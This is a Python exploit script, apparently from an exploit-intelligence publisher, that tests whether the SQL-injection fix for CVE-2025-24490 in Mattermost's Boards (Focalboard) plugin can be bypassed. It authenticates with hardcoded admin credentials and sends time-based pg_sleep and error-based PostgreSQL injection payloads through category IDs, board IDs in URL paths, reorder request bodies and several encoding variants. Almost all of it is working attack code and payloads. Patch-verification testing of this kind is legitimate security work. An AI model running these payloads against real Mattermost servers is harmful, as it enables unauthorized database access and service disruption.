#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : Mattermost Boards Plugin — Bypass Analysis (Patched Version)
# CVE            : CVE-2025-24490
# Vendor         : Mattermost
# Product        : Mattermost Server (Boards / Focalboard Plugin)
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Disclaimer     : For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
CVE-2025-24490 — Bypass analysis against patched Mattermost 9.11.8.

Tests 5 bypass hypotheses against the patched version:
    1. Category ID injection (PreCreate override)
    2. Board ID injection via URL path (parameterization check)
    3. Direct injection in reorder body (verification bypass)
    4. Encoding variations (unicode, CHR, dollar-quoting)
    5. Error oracle comparison (parameterization validation)

REFERENCES:
    - https://nvd.nist.gov/vuln/detail/CVE-2025-24490
    - https://github.com/advisories/GHSA-p4jg-qmjv-9x26
"""

import json
import sys
import time
import urllib.request
import urllib.error
import urllib.parse

# Configuration
ADMIN_USER = "admin"
ADMIN_PASS = "Admin123!@#"
ADMIN_EMAIL = "admin@test.local"

# Time-based SQLi payload (34 chars, fits varchar(36))
SQLI_PAYLOAD_TIME = "'||(SELECT '' FROM pg_sleep(5))||'"
# Error-based SQLi payload (17 chars)
SQLI_PAYLOAD_ERROR = "'||(1/0)::text||'"
# Safe control payload
SQLI_PAYLOAD_SAFE = "'||(1/1)::text||'"


def make_request(url, method="GET", data=None, headers=None, timeout=30):
    """Make HTTP request and return (status_code, body, elapsed_time)"""
    if headers is None:
        headers = {}

    if data is not None and isinstance(data, (dict, list)):
        data = json.dumps(data).encode('utf-8')
        if 'Content-Type' not in headers:
            headers['Content-Type'] = 'application/json'

    req = urllib.request.Request(url, data=data, headers=headers, method=method)

    start = time.time()
    try:
        resp = urllib.request.urlopen(req, timeout=timeout)
        elapsed = time.time() - start
        body = resp.read().decode('utf-8', errors='replace')
        return resp.status, body, elapsed
    except urllib.error.HTTPError as e:
        elapsed = time.time() - start
        body = e.read().decode('utf-8', errors='replace')
        return e.code, body, elapsed
    except Exception as e:
        elapsed = time.time() - start
        return 0, str(e), elapsed


def login(base_url, username, password):
    """Login and return (token, user_id)"""
    url = f"{base_url}/api/v4/users/login"
    # Use urllib directly to get headers
    data = json.dumps({"login_id": username, "password": password}).encode('utf-8')
    req = urllib.request.Request(url, data=data, headers={'Content-Type': 'application/json'}, method='POST')
    resp = urllib.request.urlopen(req)
    token = resp.headers.get('Token')
    body = json.loads(resp.read().decode('utf-8'))
    return token, body['id']


def get_team_id(base_url, token):
    """Get first team ID"""
    status, body, _ = make_request(
        f"{base_url}/api/v4/users/me/teams",
        headers={"Authorization": f"Bearer {token}"}
    )
    teams = json.loads(body)
    return teams[0]['id'] if teams else None


def get_auth_headers(token):
    return {
        "Authorization": f"Bearer {token}",
        "X-Requested-With": "XMLHttpRequest",
        "Content-Type": "application/json"
    }


def get_categories(base_url, token, team_id):
    """List all categories for user+team"""
    status, body, _ = make_request(
        f"{base_url}/plugins/focalboard/api/v2/teams/{team_id}/categories",
        headers=get_auth_headers(token)
    )
    return json.loads(body) if status == 200 else []


def create_category(base_url, token, user_id, team_id, name, custom_id=None):
    """Create a category, optionally with a custom ID"""
    payload = {
        "name": name,
        "userID": user_id,
        "teamID": team_id,
        "type": "custom"
    }
    if custom_id:
        payload["id"] = custom_id

    status, body, _ = make_request(
        f"{base_url}/plugins/focalboard/api/v2/teams/{team_id}/categories",
        method="POST",
        data=payload,
        headers=get_auth_headers(token)
    )
    return status, json.loads(body) if status == 200 else body


def add_board_to_category(base_url, token, team_id, category_id, board_id):
    """Add a board to a category (board_id from URL path - no validation)"""
    # URL-encode the board_id for the path
    encoded_board_id = urllib.parse.quote(board_id, safe='')
    url = f"{base_url}/plugins/focalboard/api/v2/teams/{team_id}/categories/{category_id}/boards/{encoded_board_id}"
    status, body, _ = make_request(
        url,
        method="POST",
        headers=get_auth_headers(token)
    )
    return status, body


def reorder_categories(base_url, token, team_id, category_ids, timeout=30):
    """Trigger category reorder"""
    start = time.time()
    status, body, elapsed = make_request(
        f"{base_url}/plugins/focalboard/api/v2/teams/{team_id}/categories/reorder",
        method="PUT",
        data=category_ids,
        headers=get_auth_headers(token),
        timeout=timeout
    )
    return status, body, elapsed


def reorder_category_boards(base_url, token, team_id, category_id, board_ids, timeout=30):
    """Trigger board reorder within a category"""
    status, body, elapsed = make_request(
        f"{base_url}/plugins/focalboard/api/v2/teams/{team_id}/categories/{category_id}/boards/reorder",
        method="PUT",
        data=board_ids,
        headers=get_auth_headers(token),
        timeout=timeout
    )
    return status, body, elapsed


def test_bypass_1_original_poc(base_url, token, user_id, team_id):
    """
    BYPASS ATTEMPT 1: Original PoC - Category ID injection

    In the vulnerable version, CreateCategory accepted user-supplied IDs.
    The fix adds PreCreate() which forces a server-generated ID.
    The fix also parameterizes the SQL in reorderCategories.

    Expected result: FAIL - server should reject or override the malicious ID
    """
    print("\n" + "=" * 60)
    print("  BYPASS ATTEMPT 1: Original Category ID Injection")
    print("=" * 60)
    print(f"  Payload: {SQLI_PAYLOAD_TIME}")
    print(f"  Expected: FAIL (PreCreate forces server-side ID)")
    print()

    # Try to create a category with SQLi payload as ID
    print("[*] Creating category with SQLi payload as ID...")
    status, resp = create_category(base_url, token, user_id, team_id, "bypass-test-1", SQLI_PAYLOAD_TIME)

    if status == 200:
        created_id = resp.get('id', 'N/A')
        print(f"    Status: HTTP {status}")
        print(f"    Created ID: {created_id}")
        if created_id == SQLI_PAYLOAD_TIME:
            print("[!] WARNING: Server accepted the malicious ID!")
            print("    The PreCreate() fix may not be applied!")

            # Try to trigger the injection
            categories = get_categories(base_url, token, team_id)
            cat_ids = [c['id'] for c in categories]
            print(f"[*] Triggering reorder with {len(cat_ids)} categories...")
            status_r, body_r, elapsed = reorder_categories(base_url, token, team_id, cat_ids, timeout=15)
            print(f"    Reorder: HTTP {status_r}, elapsed: {elapsed:.2f}s")
            if elapsed > 4:
                print("[!!!] BYPASS SUCCESSFUL - SQL injection triggered on patched version!")
                return True, "Category ID injection bypassed PreCreate()"
            else:
                print("[*] Reorder succeeded but no timing delay - SQL may be parameterized")
                return False, "Category ID accepted but SQL parameterized"
        else:
            print(f"[+] PreCreate() overrode the ID: {created_id}")
            print("[+] Bypass FAILED - server generates ID server-side")
            return False, "PreCreate() forces server-side ID generation"
    else:
        print(f"    Status: HTTP {status}")
        print(f"    Response: {resp[:200] if isinstance(resp, str) else str(resp)[:200]}")
        print("[+] Bypass FAILED - server rejected malicious category")
        return False, f"Server rejected category creation (HTTP {status})"


def test_bypass_2_board_id_url_path(base_url, token, user_id, team_id):
    """
    BYPASS ATTEMPT 2: Board ID injection via URL path

    The handleUpdateCategoryBoard handler takes boardID from the URL path
    without any validation. This boardID is stored in focalboard_category_boards
    via parameterized INSERT (safe for storage).

    The fix parameterizes the SQL in reorderCategoryBoards, so even with a
    malicious stored boardID, the query should be safe.

    Expected result: FAIL - SQL parameterized in reorderCategoryBoards
    """
    print("\n" + "=" * 60)
    print("  BYPASS ATTEMPT 2: Board ID Injection via URL Path")
    print("=" * 60)
    print(f"  Payload: {SQLI_PAYLOAD_TIME}")
    print(f"  Vector: handleUpdateCategoryBoard (boardID from URL path)")
    print(f"  Expected: FAIL (SQL parameterized in reorderCategoryBoards)")
    print()

    # Create a clean category
    print("[*] Creating a clean category...")
    status, resp = create_category(base_url, token, user_id, team_id, "bypass-test-2-boards")
    if status != 200:
        print(f"[-] Failed to create category: HTTP {status}")
        return False, f"Setup failed: category creation HTTP {status}"
    category_id = resp['id']
    print(f"    Category ID: {category_id}")

    # Add a board with SQLi payload as board_id (via URL path)
    print(f"[*] Adding 'board' with SQLi payload as board_id...")
    print(f"    Payload: {SQLI_PAYLOAD_TIME}")
    status_add, body_add = add_board_to_category(base_url, token, team_id, category_id, SQLI_PAYLOAD_TIME)
    print(f"    Add board response: HTTP {status_add}")

    if status_add != 200:
        print(f"    Body: {body_add[:200]}")
        print("[+] Server rejected malicious board ID")
        # If the server rejects it, the fix added board ID validation too
        return False, f"Server rejected malicious board ID (HTTP {status_add})"

    # Verify the board was stored
    print("[*] Verifying stored board IDs in category...")
    categories = get_categories(base_url, token, team_id)
    target_cat = None
    for c in categories:
        if c['id'] == category_id:
            target_cat = c
            break

    if target_cat is None:
        print("[-] Category not found")
        return False, "Category not found after creation"

    board_metadata = target_cat.get('boardMetadata', [])
    found_malicious = False
    for bm in board_metadata:
        if bm.get('boardID') == SQLI_PAYLOAD_TIME:
            found_malicious = True
            break

    if found_malicious:
        print(f"[!] Malicious board ID stored in category!")
        print("[*] Triggering board reorder to test SQL injection...")

        board_ids = [bm.get('boardID') for bm in board_metadata]
        status_r, body_r, elapsed = reorder_category_boards(
            base_url, token, team_id, category_id, board_ids, timeout=15
        )
        print(f"    Reorder: HTTP {status_r}, elapsed: {elapsed:.2f}s")

        if elapsed > 4:
            print("[!!!] BYPASS SUCCESSFUL - SQL injection via board ID on patched version!")
            return True, "Board ID injection via URL path bypassed SQL parameterization"
        elif status_r == 500:
            print("[*] HTTP 500 - SQL error but no timing delay")
            print("    May indicate SQL parameterization is preventing injection")
            print("    but the malicious value causes a different SQL error")
            return False, f"Board ID stored but reorder failed (HTTP 500, {elapsed:.2f}s)"
        else:
            print("[+] Reorder succeeded without timing delay - SQL is parameterized")
            return False, f"Board ID stored but SQL parameterized (HTTP {status_r}, {elapsed:.2f}s)"
    else:
        print("[*] Malicious board ID not found in category metadata")
        print("    (may have been rejected or stored differently)")
        # Try with the URL-decoded version
        for bm in board_metadata:
            print(f"    Stored board ID: {bm.get('boardID', 'N/A')}")
        return False, "Malicious board ID not stored or stored differently"


def test_bypass_3_direct_reorder_injection(base_url, token, user_id, team_id):
    """
    BYPASS ATTEMPT 3: Direct injection via reorder request body

    Send malicious IDs directly in the reorder request body without
    first storing them. The verifyNewCategoriesMatchExisting function
    should reject unknown IDs.

    Expected result: FAIL - verification requires IDs exist in DB
    """
    print("\n" + "=" * 60)
    print("  BYPASS ATTEMPT 3: Direct Injection in Reorder Body")
    print("=" * 60)
    print(f"  Payload: {SQLI_PAYLOAD_TIME}")
    print(f"  Expected: FAIL (verification rejects unknown IDs)")
    print()

    # Get existing categories
    categories = get_categories(base_url, token, team_id)
    cat_ids = [c['id'] for c in categories]

    # Try injecting directly by replacing one ID with the payload
    if cat_ids:
        malicious_ids = cat_ids.copy()
        malicious_ids[0] = SQLI_PAYLOAD_TIME

        print(f"[*] Sending reorder with {len(malicious_ids)} IDs, one replaced with SQLi payload...")
        status, body, elapsed = reorder_categories(base_url, token, team_id, malicious_ids, timeout=15)
        print(f"    Status: HTTP {status}, elapsed: {elapsed:.2f}s")

        if status == 200 and elapsed > 4:
            print("[!!!] BYPASS SUCCESSFUL - Direct injection in reorder body!")
            return True, "Direct injection in reorder request body bypassed verification"
        elif status == 200:
            print("[!] Unexpected 200 - but no timing delay")
            return False, f"Unexpected HTTP 200 but no injection (elapsed: {elapsed:.2f}s)"
        else:
            print(f"[+] Server rejected unknown ID (HTTP {status})")
            return False, f"Verification rejected unknown ID (HTTP {status})"
    else:
        print("[-] No categories found to test")
        return False, "No categories available"


def test_bypass_4_encoding_variants(base_url, token, user_id, team_id):
    """
    BYPASS ATTEMPT 4: Encoding variations of board IDs

    Try URL encoding, double encoding, unicode, etc. in board IDs via
    the URL path. Even if the value reaches the database, SQL
    parameterization should prevent injection.

    Expected result: FAIL - parameterization handles any byte sequence
    """
    print("\n" + "=" * 60)
    print("  BYPASS ATTEMPT 4: Encoding Variations of Board IDs")
    print("=" * 60)
    print(f"  Expected: FAIL (parameterization handles any input)")
    print()

    # Create a category for this test
    status, resp = create_category(base_url, token, user_id, team_id, "bypass-test-4-encoding")
    if status != 200:
        print(f"[-] Failed to create category: HTTP {status}")
        return False, "Setup failed"
    category_id = resp['id']

    encoding_variants = [
        # Variant 1: Unicode escape (PostgreSQL E'' syntax attempt)
        ("Unicode pg_sleep", "' ||(SELECT '' FROM pg_sleep(5))||'"),
        # Variant 2: Hex-encoded single quote alternative
        ("CHR function", "'||CHR(39)||pg_sleep(5)||CHR(39)||'"),
        # Variant 3: Dollar-quoted string (PostgreSQL feature)
        ("Dollar quote", "'||$$||pg_sleep(5)||$$||'"),
        # Variant 4: Comment-based bypass
        ("Comment bypass", "'/**/||(pg_sleep(5))||'"),
        # Variant 5: Nested subquery
        ("Nested subquery", "'||(SELECT pg_sleep(5))||'"),
    ]

    results = []
    for name, payload in encoding_variants:
        if len(payload) > 36:
            print(f"  [{name}] SKIP - payload too long ({len(payload)} chars > 36)")
            results.append((name, "skipped", "payload > 36 chars"))
            continue

        print(f"  [{name}] Payload: {payload} ({len(payload)} chars)")

        # Try to add as board ID
        status_add, body_add = add_board_to_category(base_url, token, team_id, category_id, payload)
        print(f"    Add board: HTTP {status_add}")

        if status_add == 200:
            # Try to trigger reorder
            cats = get_categories(base_url, token, team_id)
            target = None
            for c in cats:
                if c['id'] == category_id:
                    target = c
                    break

            if target and target.get('boardMetadata'):
                board_ids = [bm['boardID'] for bm in target['boardMetadata']]
                status_r, body_r, elapsed = reorder_category_boards(
                    base_url, token, team_id, category_id, board_ids, timeout=12
                )
                print(f"    Reorder: HTTP {status_r}, elapsed: {elapsed:.2f}s")

                if elapsed > 4:
                    print(f"    [!!!] TIMING DELAY DETECTED!")
                    results.append((name, "BYPASS!", f"Timing: {elapsed:.2f}s"))
                else:
                    results.append((name, "no injection", f"HTTP {status_r}, {elapsed:.2f}s"))
            else:
                results.append((name, "stored but no reorder", "board not in metadata"))
        else:
            results.append((name, "rejected", f"HTTP {status_add}"))

    print("\n  Encoding bypass results:")
    any_bypass = False
    for name, result, detail in results:
        status_char = "!!!" if "BYPASS" in result else "✓" if "rejected" in result or "no injection" in result else "?"
        print(f"    [{status_char}] {name}: {result} ({detail})")
        if "BYPASS" in result:
            any_bypass = True

    if any_bypass:
        return True, "Encoding bypass found"
    return False, "All encoding variants failed"


def test_bypass_5_error_oracle_on_patched(base_url, token, user_id, team_id):
    """
    BYPASS ATTEMPT 5: Error-based oracle via board ID

    Try the error-based payload (1/0) via board ID path.
    If the SQL is truly parameterized, the value '||(1/0)::text||' should
    be treated as a literal string, NOT executed as SQL.

    Expected result: HTTP 200 (parameterized value is just a string)
    If we get HTTP 500, the fix may be incomplete.
    """
    print("\n" + "=" * 60)
    print("  BYPASS ATTEMPT 5: Error Oracle via Board ID (Parameterized)")
    print("=" * 60)
    print(f"  Error payload: {SQLI_PAYLOAD_ERROR}")
    print(f"  Safe payload: {SQLI_PAYLOAD_SAFE}")
    print(f"  Expected: Both return same HTTP status if SQL is parameterized")
    print()

    for label, payload in [("Safe (1/1)", SQLI_PAYLOAD_SAFE), ("Error (1/0)", SQLI_PAYLOAD_ERROR)]:
        # Create fresh category
        cat_name = f"bypass-5-{label[:4].strip()}-{int(time.time())}"
        status, resp = create_category(base_url, token, user_id, team_id, cat_name)
        if status != 200:
            print(f"  [{label}] SKIP - could not create category (HTTP {status})")
            continue
        category_id = resp['id']

        # Add board with payload
        status_add, body_add = add_board_to_category(base_url, token, team_id, category_id, payload)
        print(f"  [{label}] Add board: HTTP {status_add}")

        if status_add == 200:
            # Get boards in category
            cats = get_categories(base_url, token, team_id)
            target = None
            for c in cats:
                if c['id'] == category_id:
                    target = c
                    break

            if target and target.get('boardMetadata'):
                board_ids = [bm['boardID'] for bm in target['boardMetadata']]
                status_r, body_r, elapsed = reorder_category_boards(
                    base_url, token, team_id, category_id, board_ids, timeout=12
                )
                print(f"  [{label}] Reorder: HTTP {status_r}, elapsed: {elapsed:.2f}s")
            else:
                print(f"  [{label}] Board not in metadata")
        else:
            print(f"  [{label}] Board rejected: {body_add[:100]}")

    print()
    print("  If both return HTTP 200: SQL is parameterized (fix complete)")
    print("  If error=500, safe=200: SQL injection still works (BYPASS)")
    return False, "Error oracle test complete (see output)"


def main():
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <host> <port>")
        print(f"Example: {sys.argv[0]} localhost 8066")
        sys.exit(1)

    host = sys.argv[1]
    port = sys.argv[2]
    base_url = f"http://{host}:{port}"

    print("=" * 70)
    print("  CVE-2025-24490 BYPASS ANALYSIS")
    print("  Testing patched Mattermost (9.11.8) with focalboard v9.0.5")
    print(f"  Target: {base_url}")
    print("=" * 70)

    # Authenticate
    print("\n[*] Authenticating...")
    try:
        token, user_id = login(base_url, ADMIN_USER, ADMIN_PASS)
    except Exception as e:
        print(f"[-] Login failed: {e}")
        sys.exit(1)
    print(f"[+] Logged in as {ADMIN_USER} (ID: {user_id})")

    team_id = get_team_id(base_url, token)
    print(f"[+] Team ID: {team_id}")

    # Run all bypass tests
    results = []

    # Test 1: Original PoC
    success, detail = test_bypass_1_original_poc(base_url, token, user_id, team_id)
    results.append(("1: Category ID injection", success, detail))

    # Test 2: Board ID via URL path
    success, detail = test_bypass_2_board_id_url_path(base_url, token, user_id, team_id)
    results.append(("2: Board ID via URL path", success, detail))

    # Test 3: Direct reorder body injection
    success, detail = test_bypass_3_direct_reorder_injection(base_url, token, user_id, team_id)
    results.append(("3: Direct reorder injection", success, detail))

    # Test 4: Encoding variations
    success, detail = test_bypass_4_encoding_variants(base_url, token, user_id, team_id)
    results.append(("4: Encoding variations", success, detail))

    # Test 5: Error oracle comparison
    success, detail = test_bypass_5_error_oracle_on_patched(base_url, token, user_id, team_id)
    results.append(("5: Error oracle (param test)", success, detail))

    # Summary
    print("\n" + "=" * 70)
    print("  BYPASS ANALYSIS SUMMARY")
    print("=" * 70)

    any_bypass = False
    for name, success, detail in results:
        status = "BYPASS FOUND!" if success else "No bypass"
        print(f"  [{status:15s}] {name}")
        print(f"                    → {detail}")
        if success:
            any_bypass = True

    print()
    if any_bypass:
        print("[!!!] ONE OR MORE BYPASSES FOUND - FIX IS INCOMPLETE!")
    else:
        print("[+] NO BYPASSES FOUND - FIX APPEARS COMPREHENSIVE")
        print("    The SQL parameterization via sq.Expr(\"?\", value) is effective.")
        print("    PreCreate() prevents user-controlled category IDs.")
        print("    Input validation provides defense-in-depth.")
    print("=" * 70)

    return 0 if not any_bypass else 1


if __name__ == "__main__":
    sys.exit(main())
